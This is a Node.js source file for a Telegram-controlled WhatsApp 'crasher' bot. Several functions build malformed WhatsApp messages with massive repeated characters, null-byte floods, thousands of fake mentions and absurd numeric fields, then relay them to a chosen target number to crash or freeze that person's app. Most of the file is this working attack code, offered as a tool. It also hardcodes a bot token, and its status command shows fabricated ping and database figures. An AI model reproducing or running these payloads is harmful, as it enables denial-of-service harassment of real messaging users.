const axios = require('axios');
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const path = require("path");
const { Boom } = require("@hapi/boom");
const chalk = require("chalk");
const pino = require("pino");
const os = require("os");
const readline = require("readline");
const TelegramBot = require("node-telegram-bot-api");
const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const {
  default: baileys,
  proto,
  getContentType,
  generateWAMessage,
  generateWAMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");

// ==========================
// KONFIGURASI TELEGRAM BOT
// ==========================
const BOT_TOKEN = "8480648852:AAEsONEG3oERwhh78oacff6kFI9T7Pau_3M"; // <== letak token bot sini
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

let waSocket = null;
let isPaired = false;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ===========================
// FUNCTION MU TEMPEL
// ===========================
async function AxMaker2(target, sock) {
  const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 99999999,
         expectedVideoCount: 0, 
      }
   }, {});
  
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " #1stRaldzz€xe ", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "menu_options", 
            paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #1stRaldzz€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }
  };

  const msg4 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(60000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "support@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ],
               messageAssociation: {
                 associationType: 1,
                 parentMessageKey: album.key
               }
             }
           }
         };

    let msg5 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " #1stRaldzz€xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            statusAttributionType: "SHARED_FROM_MENTION",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              ),
            ]
          }
        }
      }
    }
  }, {});
  
  const msg6 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(60000),
      publisher: "ꦾ".repeat(60000),
      caption: " ### ",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        }
      ],
      fileLength: "999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
       remoteJid: "X",
       participant: "0@s.whatsapp.net",
       stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "0@s.whatsapp.net",
             ...Array.from({ length: 1990 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "support@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  }, {});

  for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green("SUCCESS SEND AXMAKER"));
  }
}

async function iOSX(target, sock) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/Darkverse-RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/AllTheFeels",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function XUI1(targetJid, sock) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        targetJid,
        ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    try {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: '666@newsletter',
                            newsletterName: "ꦾ".repeat(60000),
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                            caption: "ꦾ".repeat(90000),
                            inviteExpiration: Date.now() + 0x99999999999abcdef,
                        },
                    },
                },
                nativeFlowMessage: {
                    messageParamsJson: "[{".repeat(10000),
                    buttons: [
                        {
                            name: "payment_status",
                            buttonParamsJson: "\u0000".repeat(808808)
                        },
                        {
                            name: "single_select",
                            buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                        },
                        {
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({ status: "1" })
                        },
                        {
                            name: "call_permission_request",
                            buttonParamsJson: "[{".repeat(808808)
                        }
                    ]
                },
                contextInfo: {
                    remoteJid: targetJid,
                    participant: targetJid,
                    mentionedJid: mentionedList,
                    stanzaId: sock.generateMessageTag(),
                    businessMessageForwardInfo: {
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    },
                },
            };

            await sock.relayMessage(targetJid, message, {
                userJid: targetJid,
            });
    } catch (error) {
        console.log("error:\n" + error);
    }
}

async function XUI2(targetJid, sock) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 15; i++) {
      push.push({
        "body": {
          "text": " ~ R𝟺ʟᴅzExǝcut¡!on— " + "ꦾ".repeat(5555),
        },
        "header": { 
          "title": "ꦾ".repeat(45000),
          "hasMediaAttachment": false,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(targetJid, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": " ~ R𝟺ʟᴅzExǝcut¡!on— " + "ꦾ".repeat(45000)
            },
            "footer": {
              "text": "enak bang?"  },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});
 await sock.relayMessage(targetJid, carousel.message, {
messageId: carousel.key.id
});
}

async function urllocdroid(target, client) { 
  const trigger = "ꦾ".repeat(61111);
  const urlCrash = `https://${trigger}.crash.whatsapp-android.pnx.com/${trigger}/${trigger}/${trigger}/`;
  await client.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: "‼️⃟ ༚ ./r4ldz.   " + trigger,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: urlCrash,
        url: urlCrash,
        thumbnailUrl: urlCrash,
        waWebSocketUrl: urlCrash,
        mediaUrl: urlCrash,
        sourceUrl: urlCrash,
        originalImageUrl: urlCrash,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"@s.whatsapp.net"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: trigger,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: "‼️⃟ ༚ ./rãldzavgrs.   " + trigger,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1990 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
              ],
          stanzaId: client.generateMessageTag(),
          virtexId: client.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e+21 * 999999999999999999999999999999999999999999999999999999999e+21 * Date.now()
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function lottieSql(target, sock) {
  const lottieMsg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Hu97Uc0XAUv82l507qXZfYF6dlrIB0/GKdB/nRvYpZw=",
            fileEncSha256: "YxrC0SoMBHP3msQt7SBUQepYDHH+l+PXfp1Nam7OhXo=",
            mediaKey: "Pbjsi5FmJ6PaTIHxd3MHS/i6WN/PKDHjFv/jbuaKM28=",
            mimetype: "application/was",
            height: 9999,
            width: 9999,
            directPath: "/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0",
            fileLength: "999999999",
            mediaKeyTimestamp: "1755002437",
            isAnimated: true,
            stickerSentTs: "1755002439632",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              statusAttributionType: 2,
              forwardingScore: 8888,
              isForwarded: true,
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 1999 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            }
          }
        }
      }
    }),
    { participant: { jid: target } }
  );

  await sock.relayMessage(target, lottieMsg.message, {
    participant: { 
      jid: target 
    }, 
    messageId: lottieMsg.key.id, 
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "payment_method"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
  
 await sock.sendNode({
   tag: "message",
    attrs: {
      id: crypto.randomBytes(32),
      to: "@s.whatsapp.net",
      type: "media",
    },
    content: [
      {
        tag: "status",
        attrs: {},
        content: null,
      },
    ],
  }); 
}

// ===========================
// FUNGSI START BOT WA
// ===========================
async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });
  waSocket = sock;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log("❌ Koneksi WA terputus:", reason);
      isPaired = false;
      startBot();
    }
    if (connection === "open") {
      console.clear();
      console.log(chalk.green("✅ Bot WA aktif"));
      isPaired = true;
    }
  });

  sock.ev.on("creds.update", saveCreds);

  // pairing tak auto, tunggu command dari Telegram
  if (!waSocket.authState.creds.registered) {
    console.log(chalk.yellow("⏳ Belum ada sesi WhatsApp."));
    console.log(chalk.yellow("Ketik /pair <no_whatsapp> di bot Telegram untuk pairing."));
  }
}

// ===========================
// /status_server CEK SERVER
// ===========================
bot.onText(/^\/status_server$/, async (msg) => {
  const chatId = msg.chat.id;

  // Dapatkan maklumat server
  const totalMem = os.totalmem() / 1024 / 1024; // MB
  const freeMem = os.freemem() / 1024 / 1024;   // MB
  const usedMem = totalMem - freeMem;
  const ramUsage = ((usedMem / totalMem) * 100).toFixed(2);

  const cpuLoad = os.loadavg()[0].toFixed(2); // 1 min average
  const uptime = process.uptime(); // dalam saat
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);

  // DB entries random (1–500)
  const dbEntries = Math.floor(Math.random() * 500) + 1;

  // Ping palsu (buat nampak real)
  const ping = (Math.random() * (50 - 10) + 10).toFixed(0); // 10–50 ms

  const timeMY = new Date().toLocaleString("ms-MY", {
    timeZone: "Asia/Kuala_Lumpur",
  });

  const message = `
*⚙️ Systemcrasher X NullXTeam*

🟢 *Server Status:* Aktif
🕒 *Jam (MYT):* ${timeMY}
📶 *Ping:* ${ping} ms
🧠 *RAM:* ${usedMem.toFixed(0)} MB / ${totalMem.toFixed(0)} MB (${ramUsage}% digunakan)
💻 *CPU:* ${cpuLoad}%
⏱️ *Uptime:* ${hours} h ${minutes} m ${seconds} s
📁 *DB Entries:* ${dbEntries}
  `;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===========================
// TELEGRAM BOT COMMAND
// ===========================
bot.onText(/^\/pair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1].replace(/\D/g, "");

  try {
    if (!waSocket) return bot.sendMessage(chatId, "❌ Bot WA belum siap.");
    const code = await waSocket.requestPairingCode(number);
    await bot.sendMessage(chatId, `✅ Kode Pairing untuk *${number}*: \`${code}\``, { parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, `❌ Gagal generate pairing code:\n${e.message}`);
  }
});

// Cek status bot
bot.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const status = isPaired ? "✅ Bot WA aktif" : "❌ Belum pairing";
  bot.sendMessage(chatId, status);
});

// ===========================
// LIST SENDER COMMAND
// ===========================
bot.onText(/^\/list_sender$/, async (msg) => {
  const chatId = msg.chat.id;

  if (waSocket && waSocket.authState && waSocket.authState.creds && waSocket.authState.creds.me) {
    const me = waSocket.authState.creds.me;
    const myNumber = me.id.split("@")[0];
    const message = `
📌 *Connected WhatsApp Sender (Online):*
Messenger Session
1. ${myNumber}
    `;
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } else {
    const message = `
📌 *Connected WhatsApp Sender (Online):*
Messenger Session
❌ None
    `;
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  }
});

// ===========================
// START & HELP COMMAND
// ===========================

// /start → tunjuk mesej permulaan
bot.onText(/^\/menu$/, (msg) => {
  const chatId = msg.chat.id;
  const message = `
👋 *Hai ${msg.from.first_name || "pengguna"}!*

WAJIB JOIN CH GW : @NewTestiOrzaa UNTUK MENGGUNAKAN FITUR DLL KETIK DI BWH
/orza
  `;
  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// /help → tunjuk senarai command dan fungsi
bot.onText(/^\/orza$/, (msg) => {
  const chatId = msg.chat.id;
  const message = `
𝐒𝐲𝐬𝐭𝐞𝐦𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐗 𝐍𝐮𝐥𝐥𝐗𝐓𝐞𝐚𝐦

𝗔𝘂𝘁𝗵𝗼𝗿: @OrzaaSystem & @RaldzzXyz
𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @NewTestiOrzaa
𝗩𝗲𝗿𝘀𝗶𝗼𝗻: 5.5.5

🔆 */pair* <number>
— ADD SENDER

🔆 */status*
— CEK STATUS NUMBER AKTIF

🔆 */list_sender*
— LIST SENDER ONLINS

🔆 */getkey* id
— KEY SECURITY AKSES

🔆 */cekbug*
— STATUS BUG 

🔆 */cek_func*
— LIST FUNCTION BUG

🔆 */refresh*
— REFRESH PANEL

🔆 */status_server*
— SERVER STATUS 

  `;
  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===========================
// CEK FUNC COMMAND (BLOCKQUOTE STYLE, FIXED)
// ===========================
bot.onText(/^\/cek_func$/, async (msg) => {
  const chatId = msg.chat.id;
  const filePath = __filename; // betulkan path file semasa

  try {
    const code = fs.readFileSync(filePath, "utf8");

    // Cari semua async function
    const regex = /async\s+function\s+([a-zA-Z0-9_]+)/g;
    const functions = [];
    let match;
    while ((match = regex.exec(code)) !== null) {
      functions.push(match[1]);
    }

    if (functions.length === 0) {
      return bot.sendMessage(chatId, "❌ Tiada async function dijumpai dalam file ini.");
    }

    const list = functions.map((fn, i) => `${i + 1}. ${fn}`).join("\n");
    const message = `
📋 *LIST FUNC DIPAKAI ✅️*
\`\`\`
${list}
\`\`\`
Total: ${functions.length} fungsi dijumpai.
    `;

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error("Error semak fungsi:", e);
    bot.sendMessage(chatId, "❌ Gagal semak senarai fungsi.");
